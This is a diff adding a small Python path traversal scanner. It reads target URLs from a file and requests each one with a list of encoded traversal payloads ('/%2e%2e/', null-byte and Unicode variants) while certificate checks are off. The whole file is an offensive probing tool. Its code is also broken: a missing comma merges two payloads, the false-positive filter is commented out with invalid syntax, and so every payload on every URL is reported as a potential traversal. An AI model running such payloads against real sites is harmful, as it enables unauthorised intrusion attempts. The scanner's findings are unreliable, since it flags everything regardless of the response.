@@ -1,0 +1,41 @@
+#!/bin/python3
+import sys
+import json
+import requests
+
+payloads=[
+	"/../",
+	"/.%2e;/",
+	"/%2e%2e/",
+	"/.%2e%00/",
+	"/.%2e%0d/",
+	"/.%2e%5c/",
+	"/.%2e%ff/"
+	"/.%2e\\",
+	"/‥/",
+	"/︰/"
+]
+
+if len(sys.argv) < 2:
+	print("path_traversor <urlfile>")
+	exit()
+
+urlfile = open(sys.argv[1], 'r')
+urls = urlfile.readlines()
+
+for url in urls:
+	baseUrl = url.split('/', 0)
+
+	baseResponse = requests.get(url, verify=False)
+
+	notFoundResponse = requests.get(url+"/asuyfdityasfdiytasfytdfty", verify=False)
+	# if notFoundResponse.status == 200:
+	#	
+
+	for payload in payloads:
+		response = requests.get(url+payload, verify=False)
+
+		#if response = baseResponse or response = notFoundResponse:
+		#	continue
+
+		print("[POTENTIAL Traversal] %s" % url+payload)
